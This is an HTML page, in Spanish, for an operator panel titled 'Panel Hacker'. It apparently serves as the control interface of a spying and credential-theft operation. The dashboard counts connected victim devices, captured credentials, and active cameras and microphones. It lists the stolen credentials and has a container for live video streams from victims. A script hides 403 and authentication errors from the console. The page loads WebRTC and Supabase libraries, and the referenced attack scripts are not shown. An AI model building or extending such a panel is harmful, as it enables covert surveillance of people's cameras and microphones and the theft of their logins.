<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Hacker - Red Asistencia SV</title>
    <!-- Evitar error 404 de Favicon -->
    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
    
    <!-- SILENCIADOR NUCLEAR DE ERRORES -->
    <script>
        // Bloquear errores de consola antes de que ocurran
        const swallow = (args) => {
            const msg = args.join(' ');
            return msg.includes('403') || msg.includes('Realtime') || msg.includes('Postgres') || msg.includes('JWT') || msg.includes('Object');
        };

        const originalError = console.error;
        const originalWarn = console.warn;
        
        console.error = function(...args) { if (!swallow(args)) originalError.apply(console, args); };
        console.warn = function(...args) { if (!swallow(args)) originalWarn.apply(console, args); };

        // Matar promesas rechazadas (El error 403 Uncaught)
        window.onunhandledrejection = function(event) {
            if (event.reason && (event.reason.code === '403' || event.reason.status === 403 || typeof event.reason === 'object')) {
                event.preventDefault();
                event.stopPropagation();
                return false;
            }
        };

        // Capturar errores de red
        window.addEventListener('error', function(event) {
            if (event.message && event.message.includes('403')) event.preventDefault();
        }, true);
    </script>

    <link rel="stylesheet" href="css/admin.css">
</head>

<body>
    <div class="container">
        <div class="header">
            <h1>PANEL DE ADMINISTRACIÓN</h1>
            <div class="status">
                <span class="status-indicator active"></span>
                <span>Sistema Activo</span>
            </div>
        </div>

        <div class="dashboard">
            <div class="stats">
                <div class="stat-item">
                    <span class="stat-label">Dispositivos Conectados</span>
                    <span class="stat-value" id="device-count">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Credenciales Capturadas</span>
                    <span class="stat-value" id="credentials-count">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Cámaras Activas</span>
                    <span class="stat-value" id="camera-count">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Micrófonos Activos</span>
                    <span class="stat-value" id="mic-count">0</span>
                </div>
            </div>

            <div class="device-list">
                <h2>Dispositivos Monitoreados (Activos)</h2>
                <div id="devices-container"></div>
            </div>

            <div class="credentials-list" style="margin-top: 20px;">
                <h2>Credenciales Capturadas</h2>
                <div id="credentials-container" style="background: #001100; border: 1px solid #0f0; border-radius: 4px; max-height: 200px; overflow-y: auto; padding: 10px;">
                    <p style="color: #666; font-style: italic;">Sin credenciales capturadas aún.</p>
                </div>
            </div>

            <div class="media-streams" id="media-streams" style="margin-top: 20px; display: none;">
                <h2>Streams en Vivo</h2>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;" id="streams-container">
                    <!-- Los videos de las victimas irán aquí -->
                </div>
            </div>
        </div>

        <div class="terminal">
            <div class="terminal-header">
                <span>Terminal de Control</span>
                <button id="clear-terminal">Limpiar</button>
            </div>
            <div class="terminal-body" id="terminal"></div>
        </div>
    </div>

    <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <script src="js/config.js"></script>
    <script src="js/admin.js"></script>
</body>

</html>
